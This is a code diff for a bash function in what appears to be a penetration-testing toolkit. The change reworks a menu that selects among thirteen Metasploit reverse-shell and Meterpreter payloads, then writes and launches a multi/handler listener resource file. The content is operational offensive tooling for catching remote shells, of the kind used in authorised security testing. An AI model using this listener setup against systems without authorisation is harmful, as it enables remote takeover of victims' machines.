@@ -54,11 +54,11 @@ nb-shell-handlers-msf-listener() {
     __check-project
     nb-vars-set-lhost
     nb-vars-set-lport
-    payload=$1
 
     clear
 
-    echo "Choose a payload type:"
+    #echo "Choose a payload type:"
+    __ask "Choose a payload type:"
     echo "1.  android/meterpreter/reverse_tcp"
     echo "2.  cmd/windows/reverse_powershell"
     echo "3.  java/jsp_shell_reverse_tcp"
@@ -73,32 +73,36 @@ nb-shell-handlers-msf-listener() {
     echo "12. windows/x64/meterpreter_reverse_https"
     echo "13. windows/x64/meterpreter_reverse_tcp"
     echo "14. Previous menu"
+    echo
+    echo -n "Choice: "
+    read choice
 
-    read -p "Enter your choice: " choice
     case $choice in
-        1) setup_listener android/meterpreter/reverse_tcp;;
-        2) setup_listener cmd/windows/reverse_powershell;;
-        3) setup_listener java/jsp_shell_reverse_tcp;;
-        4) setup_listener linux/x64/meterpreter_reverse_https;;
-        5) setup_listener linux/x64/meterpreter_reverse_tcp;;
-        6) setup_listener linux/x64/shell/reverse_tcp;;
-        7) setup_listener osx/x64/meterpreter_reverse_https;;
-        8) setup_listener osx/x64/meterpreter_reverse_tcp;;
-        9) setup_listener php/meterpreter/reverse_tcp;;
-        10) setup_listener python/meterpreter_reverse_https;;
-        11) setup_listener python/meterpreter_reverse_tcp;;
-        12) setup_listener windows/x64/meterpreter_reverse_https;;
-        13) setup_listener windows/x64/meterpreter_reverse_tcp;;
+        1) __PAYLOAD=android/meterpreter/reverse_tcp;;
+        2) __PAYLOAD=cmd/windows/reverse_powershell;;
+        3) __PAYLOAD=java/jsp_shell_reverse_tcp;;
+        4) __PAYLOAD=linux/x64/meterpreter_reverse_https;;
+        5) __PAYLOAD=linux/x64/meterpreter_reverse_tcp;;
+        6) __PAYLOAD=linux/x64/shell/reverse_tcp;;
+        7) __PAYLOAD=osx/x64/meterpreter_reverse_https;;
+        8) __PAYLOAD=osx/x64/meterpreter_reverse_tcp;;
+        9) __PAYLOAD=php/meterpreter/reverse_tcp;;
+        10) __PAYLOAD=python/meterpreter_reverse_https;;
+        11) __PAYLOAD=python/meterpreter_reverse_tcp;;
+        12) __PAYLOAD=windows/x64/meterpreter_reverse_https;;
+        13) __PAYLOAD=windows/x64/meterpreter_reverse_tcp;;
         14) exit;;
         *) echo "Invalid option";;
     esac
+    
+    clear
     
     # Generate a random number for the file name
     rand=$(shuf -i 1000-9999 -n 1)
     rc_file="/tmp/msf_listener_$rand.rc"
 
     echo "use exploit/multi/handler" > "$rc_file"
-    echo "set payload $payload" >> "$rc_file"
+    echo "set payload ${__PAYLOAD}" >> "$rc_file"
     echo "set LHOST ${__LHOST}" >> "$rc_file"
     echo "set LPORT ${__LPORT}" >> "$rc_file"
     echo "exploit -j" >> "$rc_file"
